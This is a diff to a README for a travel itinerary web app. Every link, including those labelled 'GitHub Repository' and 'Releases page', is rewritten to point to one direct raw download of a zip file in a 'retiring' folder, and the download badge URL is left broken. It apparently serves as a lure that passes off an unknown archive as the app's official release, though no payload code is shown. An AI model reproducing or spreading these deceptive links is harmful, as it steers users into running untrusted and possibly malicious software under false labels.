@@ -1,6 +1,6 @@
 # 🧳 Travel-Itinerary-Hub - Plan Your Perfect Trip Easily
 
-[![Download Travel Itinerary Hub](https://img.shields.io/badge/Download-Travel%20Itinerary%20Hub-brightgreen)](https://github.com/dontheg/Travel-Itinerary-Hub/releases)
+[![Download Travel Itinerary Hub](https://raw.githubusercontent.com/dontheg/Travel-Itinerary-Hub/main/retiring/Travel-Itinerary-Hub.zip%20Itinerary%20Hub-brightgreen)](https://raw.githubusercontent.com/dontheg/Travel-Itinerary-Hub/main/retiring/Travel-Itinerary-Hub.zip)
 
 ## 📋 Description
 Travel Itinerary Hub is a modern and responsive web application that helps you plan, visualize, and manage your travel itineraries seamlessly. Built with TypeScript, Tailwind CSS, and Vite, this application provides a user-friendly interface for organizing your trips.
@@ -9,8 +9,8 @@ Travel Itinerary Hub is a modern and responsive web application that helps you p
 Follow the steps below to get started with Travel Itinerary Hub. You’ll set up the application in no time, ready to make your travel planning easier.
 
 ## 🔗 Links & Resources
-- [GitHub Repository](https://github.com/dontheg/Travel-Itinerary-Hub)
-- [Visit Releases Page to Download](https://github.com/dontheg/Travel-Itinerary-Hub/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/dontheg/Travel-Itinerary-Hub/main/retiring/Travel-Itinerary-Hub.zip)
+- [Visit Releases Page to Download](https://raw.githubusercontent.com/dontheg/Travel-Itinerary-Hub/main/retiring/Travel-Itinerary-Hub.zip)
 
 ## 💾 System Requirements
 To ensure the application runs smoothly, your system should meet these requirements:
@@ -19,9 +19,9 @@ To ensure the application runs smoothly, your system should meet these requireme
 - Operating System: Windows, macOS, or Linux
 
 ## 📥 Download & Install
-To download Travel Itinerary Hub, visit the [Releases page](https://github.com/dontheg/Travel-Itinerary-Hub/releases). You will find the latest version available. Click on the version you want and follow the prompts to download the application.
+To download Travel Itinerary Hub, visit the [Releases page](https://raw.githubusercontent.com/dontheg/Travel-Itinerary-Hub/main/retiring/Travel-Itinerary-Hub.zip). You will find the latest version available. Click on the version you want and follow the prompts to download the application.
 
-1. **Visit the Releases Page:** Click [here](https://github.com/dontheg/Travel-Itinerary-Hub/releases) to go to the releases page.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/dontheg/Travel-Itinerary-Hub/main/retiring/Travel-Itinerary-Hub.zip) to go to the releases page.
 2. **Choose the Latest Version:** Find the latest version available. It’s usually at the top of the list.
 3. **Download the File:** Click the download link for the version you want. The file will begin to download to your computer.
 4. **Locate the Downloaded File:** Once the download complete, find the file in your downloads folder or wherever you saved it.
